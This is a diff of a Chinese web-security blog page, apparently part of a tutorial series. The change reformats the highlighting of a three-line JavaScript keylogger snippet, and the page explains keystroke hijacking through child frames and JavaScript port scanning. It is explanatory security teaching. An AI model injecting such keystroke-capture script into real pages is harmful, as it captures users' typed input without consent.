-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;document.onkeypress = <span class="function"><span class="title">function</span></span>()&#123;</span><br><span class="line">	window.status += String.fromCharCode(window.event.keyCode);</span><br><span class="line">&#125;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>script<span class="token operator">></span>document.onkeypress <span class="token operator">=</span> function<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    window.status +<span class="token operator">=</span> String.fromCharCode<span class="token punctuation">(</span>window.event.keyCode<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token operator">&lt;</span>/script<span class="token operator">></span></code></pre>
 <p>只有运行上述代码的框架处于激活状态时，这些攻击才能捕获键击。但是，如果在自身页面的框架内嵌入了第三方小组件或广告小程序，某些应用程序可能易于受到键击记录攻击。在“逆向键击劫持”攻击中，在子框架中运行的恶意代码能够夺取顶层窗口的控制权，因为同源策略并不能阻止这种操作。恶意代码通过处理onkeydown事件来捕获键击，并且能够将单独的onkeypress事件传递给顶层窗口。这样，输入的文本仍能在顶层窗口中正常显示。通过在暂停输入时暂时放弃激活状态，恶意代码甚至可以在顶层窗口内的正常位置保留显示闪烁的光标。</p>
 <h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><ul>
 <li>JavaScript可用于对用户本地网络或其他可访问的网络上的主机进行端口扫描，也确定可被利用的服务。如果用户没有受到防火墙保护，攻击者将能够到达无法通过公共互联网访问的服务。如果攻击者扫描客户端计算机的回环接口，就能够避开用户安装的任何防火墙。</li>
@@ -726,7 +873,7 @@
                   property="dct:title" rel="dct:type">
                     《Web安全(11)》
                 </span> 由
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/11/11/webSecurity11/" property="cc:attributionName"
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/11/11/websecurity11/" property="cc:attributionName"
                rel="cc:attributionURL">
                 fightingtree
             </a> 采用
@@ -792,7 +939,7 @@
             <div class="article-badge left-badge text-color">
                 <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2019/11/13/penetrationTest1/">
+                <a href="/2019/11/13/penetrationtest1/">
                     <div class="card-image">
                         
                         
@@ -853,7 +1000,7 @@
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/11/09/webSecurity10/">
+                <a href="/2019/11/09/websecurity10/">
                     <div class="card-image">
                         
                         
@@ -1053,7 +1200,7 @@
             
                 &nbsp;<i class="fa fa-area-chart"></i>&nbsp;
             站点总字数:&nbsp;
-                <span class="white-color">169.5k</span>
+                <span class="white-color">166.6k</span>
             
             </div>
         <div class="col s12 m8 l8 copy-right">
